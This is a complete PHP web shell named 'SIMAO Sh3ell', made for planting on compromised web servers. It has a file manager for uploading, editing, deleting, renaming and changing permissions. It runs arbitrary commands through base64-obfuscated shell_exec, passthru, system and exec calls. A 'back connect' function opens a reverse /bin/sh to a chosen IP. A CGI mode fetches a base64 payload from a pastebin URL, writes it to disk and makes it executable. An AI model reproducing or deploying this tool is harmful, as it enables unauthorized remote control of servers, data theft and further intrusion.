<?php

echo '<title>SIMAO Sh3ell</title>';

@session_start();





echo "<fontstyle=\"  position: center;
    right: 0px;
    left: 0px;
    top: 0px;\" > 
    <font color= #0000FF>kernel </font>~ :: ";
echo php_uname();
echo " <br> <font color= #0000FF> user </font>~ ::";
echo "(".get_current_user().")";
echo " <br> <font color= #0000FF>php_verion</font> ~ ::";
echo phpversion();
echo " <br> <font color= #0000FF>hdd </font>~ ::";
echo round(disk_total_space("/") / (1024*1024*1024) ,2).".GB".":|:free space ~".round(disk_free_space("/") / (1024*1024*1024),2).".GB";

echo "</font>


";

echo '
<HEAD>
<H1><center>[#]  Stealth Sh3ell Simao [#] </center></H1>

<style>
body{
font-family: "Courier New";
background-color: #f6f5f5;
}
</style>';
echo " <style> 
p.rigth
{
	 
        position: absolute;
    right: 0px;
    top: 0px;
    padding: 10px;
	 
}
.button {
    background-color: red;
    border: none;
    color: white;
    padding: 10px 20px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    margin: 4px 2px;
    cursor: pointer;
}
.button1 {font-size: 11px;}
</style> 
<p class=rigth> <a href=?killed=kill> <button class='button button1'> delete me </button></a></p>";

if (isset($_GET['killed']))
{
	 msh_lkhra();
}
if (isset($_GET['cgi']))
{
	cgidzb();
}
function msh_lkhra()
{
      
      if(isset($_POST['yes']))
      {
      @unlink(basename(__FILE__));
      die("<center> <h1> ~ sh3ell deleted ~ </h1></center>");
      exit;
      }
      else 
      {
      	die("<center> <form method=post><input type=submit name=yes value='yes Delete it'></center>");
      }

}
if (isset($_POST['updzb']))
{
  if (!empty($_FILES['torabi']['name'])){
  $nm = $_FILES['torabi']['name'];
  $tm = $_FILES['torabi']['tmp_name'];
  move_uploaded_file($tm,"".$nm);
  echo "<center> uploaded </br> <a href=$nm>$nm</a></center>";
}
}
else 
{
  print("<center><form method=POST enctype='multipart/form-data'> <input type=file name=torabi><input type=submit name=updzb value=up></center>");

}
if (isset($_GET['delete']))
{
  echo "<form method=post>";
  echo "<center>are u ser to delete this file ?</center>";
  echo "<center> <input type=submit name=yes value=yes></center>";
  if (isset($_POST['yes'])):

   unlink($_GET['delete']);
  
  echo "<center> File Deleted :v </br> <a href=?path=".getcwd()."> back !</a></center>";
  endif;
  exit;
}
class files //class tchof lfiles  files :D
{
    //const simao = "<title> SIMAO404 StEalth Sh3ell </title>";  
    public function files() 
    {
          
        //$rc = base64_encode(getcwd());
$get = getcwd();
$di = explode('/',$get); // /var/www/...b /  

echo " <center><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\"> <body>  <div class=\"w3-container\"> <a href=?cgi=zby>   <input type=\"button\" class=\"w3-button w3-black\" value=\" [!] cgi sh3ell [!]  \"/> &nbsp;  </a>   <a href=?path=$get > <input type=\"button\" class=\"w3-button w3-black\" value=\" [!] show files [!] \"> &nbsp; </a>   <a href=?cmd=zby> <input type=\"button\" class=\"w3-button w3-black\" value=\"     [!] CMD [!] \"></a>   <a href=?back=conect> <input type=\"button\" class=\"w3-button w3-black\" value=\"                       [!] Back connect [!] \"></a>     </body></center>";
echo "<center>";

foreach ($di as $num => $pat) {

   
    echo "<a href=?path="; 
    for ($i=0; $i<=$num; $i++)
    {
	
	echo ($di[$i])."/";
     }

    echo ">$pat/</a>";

   echo '</td></tr><tr><td>';

     } echo " <form method=post> <input style='font-size: 11px;' type=submit name=creatdir value=new_dir>  ";
 if(isset($_POST['creatdir']))
    
    {

        echo "<center> <form method=post> <br> <input type=text name=filname placeholder='newdir'> <br></br><input type=submit name=creatdir value=create></center>";

        if (isset($_POST['creatdir']))
        {
        	
        	if(@mkdir(@$_POST['filname'])):
        	     print("<center> dir created </center>");

            endif;
        }
        exit;
        //exit;
    }
    
    echo " <form method=post> <input type=submit style='font-size: 11px;'name=creatfile value=new_file>  ";
 if(isset($_POST['creatfile']))
    
    {

        echo "<center> <form method=post> <br> <input type=text name=filname placeholder='newfile' > <br></br><input type=submit name=creatfile value=create></center>";

        if (isset($_POST['creatfile']))
        {
        	
        	if(@fopen(@$_POST['filname'],"a")):
                 print("<center> file created </center>");
            endif;
        }
        exit;
    }
    
   

    $a = (@$_GET['path']);
    $z = @scandir($a); //scandir 
    if ($z == true)
	{

			foreach($z as $lol)
    	{

         
          if (is_file("$a/$lol")) //$a/$lol = lpath true
          {

           if (is_writable("$a/$lol")):
         
             
             
          	echo "</br>";
          	 
            echo " <font color=green> writable -> </font> <a href=?edite=$a/$lol>$lol </a> ".round(filesize("$a/$lol") / 1024,2)." kb"." : =>  <a href=?delete=$a/$lol> <font color='red'> D </font>  <a href=?rename=$a/$lol>   <font color='#FFBF00'> R </font>  </a> <a href=?chmod=$a/$lol> <font color=\"black\"> P </a>";
          else :
            echo "</br>";
        	 
            echo " <font color=red> not writable -> </font>  <a href=?edite=$a/$lol>$lol </a> ".round(filesize("$a/$lol") / 1024,2)." kb"."  : =>  <a href=?delete=$a/$lol> <font color='red'> D </font>  <a href=?rename=$a/$lol>   <font color='#FFBF00'> R </font>  </a> <a href=?chmod=$a/$lol> <font color=\"black\"> P </a>";
            endif;

          }
          elseif(is_dir("$a/$lol"))
          {
          	
          	echo "</br>";
          	echo " dir~ <a href=?path=$a/$lol> <font color=#0B6121 >[$lol]</font ></a> <a href=?dirrename=$a/$lol> <font color=black > R </a> </a> <a href=?deletdir=$a/$lol> <font color=red > D</font> </a> ";
          }


    	}
}
    echo "</center>";

    }
}



class dir_or_file extends files //extend dzb
{
  
  public function chek() 
  {
  	if (isset($_GET['edite']))
  	{    
  		//echo parent::simao;
  		$z = $_GET['edite'];
  		echo "<form method=post> <center><br> <textarea style='width: 720px; height: 260px' name=chngfile >".htmlspecialchars(  @file_get_contents($z))."</textarea> <br><input type=submit name=chang value='edite'><br> </center>";
  		if(isset($_POST['chang'])):
  		

  		if(@file_put_contents($z,$_POST['chngfile'])):
  	    echo "<br><center> <font color=green> file changed :D</font></center>";
        $f = getcwd();
  	    exit(@header("Location:?path=$f"));
  	    else:
  	    	echo "<br><center> <font color=red> error edite file  </font></center>";
  		//echo "</textarea></center>"; 
  		endif;
  		endif;
        
  	}
  }
}


class edite extends dir_or_file //exte
{

	public $ok;

	
}



 

$z = new edite();

$z->chek();
function back_con()
{
	$ip = $_SERVER['REMOTE_ADDR'];
	echo "<center> [?] b3ack conect [?] <form method=post> </br></br> your ip :: <input type=text name=ip value=$ip> port :: <input type=text name=port value=21> &nbsp; <input type=submit name=con value=con3ect>";
	$addr = @$_POST['ip'];
	$por = @$_POST['port'];
	if (isset($_POST['con']))
	{


               $sock = @fsockopen($addr,$por,$errno,$errstr,20);
               if (!$sock):
               	echo "<br> error in conect or fsockopen desabled";
               exit;
               endif;
if ($sock)
{
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"), 
   2 => array("pipe","w")  
);
     


$process = proc_open("/bin/sh -i", $descriptorspec, $pipes);

if (is_resource($process)) {
    
     
  while (true) {
	
	


	
	if (feof($pipes[1])) {
		echo "</br>";
		print("Connection terminated atbi ");
		exit;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	
	if (in_array($sock, $read_a)) {
		 
		$input = fread($sock,true);
		 
		fwrite($pipes[0], $input);
	}

	
	if (in_array($pipes[1], $read_a)) {
		 
		$input = fread($pipes[1],true);
		 
		fwrite($sock, $input);
	}

	
	if (in_array($pipes[2], $read_a)) {
		 
		$input = fread($pipes[2],true);
		 
		fwrite($sock, $input);
	}
}
}
proc_close($process);

}
	}
}
if (isset($_GET["dirrename"]))
{  
	$dirone = @$_GET["dirrename"];
	echo "<center> </br> <form method=post > old_name ::<input style='width:333px;' type=text name=direone value=$dirone> &nbsp; rename to :: <input style='width:333px;' type=text name=newdir value=$dirone>&nbsp; <input type=submit name=ren value='rename'></center>";
	$newnamedir = @$_POST["newdir"];
	if (isset($_POST["ren"]))
    
		
	{
        
        @rename("$dirone","$newnamedir");
        die("<center></h1> <font color=green>renamed </font></h1></center>");
        exit(@header("Location:?path="));
	}
}

function cgidzb()
{
	@mkdir("Simao");
	@chdir("Simao");
	$f = fopen(".htaccess","w") or die("error in open file :/");
	$d = "Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddType application/x-httpd-cgi .sa
AddHandler server-parsed .php
AddHandler cgi-script .sa
AddHandler cgi-script .sa";

   fwrite($f,$d);
   fclose($f);
   $cgi = file_get_contents("https://pastebin.com/raw/BjVAmEbR");
   $cgi_data = base64_decode($cgi);
   $yawyaw = "simao.sa";
   $gg = fopen($yawyaw,"w+") or die("error in open the sh3ll");
   fwrite($gg,$cgi_data);
   fclose($gg);
   @chmod($yawyaw,0755);
   echo '<center><br><a href=Simao/simao.sa> <font color=black >[+] :D fk yeah cgi sh3ell created [+]</font></br></a><center>';
   exit;
}




function shells() ////////////////// hna exec 
{
$mo = "<center> no function to exec found in sv  :/ </center>";
switch($mo)
{
  
    
  case(function_exists(base64_decode("c2hlbGxfZXhlYw=="))):
  $se = base64_decode("c2hlbGxfZXhlYw==");
  echo "<center> <form method=post><input type=text name=cm placeholder='cmd dzb'><input type=submit name=cmd value=own> <br></br></center>";
    echo "<center><textarea style='color: green; width:800;height: 280px; '> ".$se(@$_POST['cm'])."</textarea></center>";
  break;
  case(function_exists(base64_decode("cGFzc3RocnU="))):
  $pt = base64_decode("cGFzc3RocnU=");
  echo "<center> <form method=post><input type=text name=cm placeholder='cmd dzb'><input type=submit name=cmd value=own> <br></br></center>";
    echo "<center><textarea style='color: green; width:800;height: 280px;'> ";
    echo @$pt(@$_POST['cm']);
    echo "</textarea></center>";
    break;
    case(function_exists(base64_decode("c3lzdGVt"))):
    $sy = base64_decode("c3lzdGVt");
    echo "<center> <form method=post><input type=text name=cm placeholder='cmd dzb'><input type=submit name=cmd value=own> <br></br></center>";
    echo "<center><textarea style='color: green; width:800;height: 280px;'> ";
    @$sy(@$_POST['cm']);
    echo "</textarea></center>";
    break;
    case(function_exists(base64_decode("ZXhlYw=="))):
    $ex = base64_decode("ZXhlYw==");
    echo "<center> <form method=post><input type=text name=cm placeholder='cmd dzb'><input type=submit name=cmd value=own> <br></br></center>";
    echo "<center><textarea style='color: green; width:800;height: 280px;'> ";
    echo @$ex(@$_POST['cm']);
    echo "</textarea></center>";
    break;
    default:
  echo $mo;
}
}
if (isset($_GET['back']))
{
	back_con();
}
if (isset($_GET['cmd']))
{
  shells();
  exit;
}
if (isset($_GET["chmod"]))
{
	chmd();
	exit;
}
//echo edite::simao;

if (isset($_GET['deletdir']))
{
    $the_dir = @$_GET['deletdir'];
    if(rmdir($the_dir)):
       echo "<center> dir deleted </center>";
    endif;
}

if (isset($_GET['rename']))
{
ethic();
}

function ethic() 
{
  echo "<center>";
  echo "<form method=post>";
  echo "the old name : "."<input style='width:400;' type=text name='oldfile' value=".@$_GET["rename"]."></br>";
  echo "nut name azby :"."<input style='width:400;'type=text name='newfile' value=".@$_GET["rename"]." >
       <br><input type=submit name=rn value='rename'>";
  if (isset($_POST['rn'])):

  $old = @$_POST['oldfile'];

  $new = @$_POST['newfile'];
  rename($old,$new);
  echo "<font color=red > file renamed to $new </font> <br> <a href=?path=".getcwd()."> back !</a> ";
  
    endif;
    echo "</center>";
    exit;

}
function chmd()
{
	$hh = @$_GET["chmod"];

	echo "<br><center>";
	echo "<form method=POST> file ::<input style='width:300px;' type=text name=old_pr value=$hh> to  prems ::<input style='width:45px;' type=text name=prem placeholder='0666'> <input type=submit name=pr value=change >" ;
    if (isset($_POST['pr']))
    {
    	$p = @$_POST['prem'];
	@chmod($hh,$p);
	echo "primis changed";
}
	echo "</center>";
}
 /*echo "<font style=\"  position: absolute;
    right: 0px;
    left: 0px;
    top: 0px;\" > krenek ~ ".php_uname()."</font>
}

";
*/

?>